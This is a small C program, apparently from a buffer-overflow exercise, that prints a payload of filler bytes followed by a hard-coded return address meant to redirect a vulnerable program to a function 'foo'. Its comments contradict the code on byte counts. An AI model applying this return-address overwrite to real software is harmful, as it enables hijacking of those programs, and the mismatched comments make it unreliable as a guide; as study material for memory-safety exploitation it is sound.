#include <stdio.h>
#include <string.h>
int main(){
	char buf[200];
	//assume we need 17 bytes to reach return address
	strcpy(buf,"aaaaaaaaaabbbbbbbbbbccccccccccddd"); // 42 bytes
	//and we overwrite return address
	//with the address of foo
	buf[33]=0xcc;
	buf[34]=0x84;
	buf[35]=0x04;
	buf[36]=0x08;
	write(1, buf, 37); 
	//write to file number 1 which is the screen
	return 0;
}
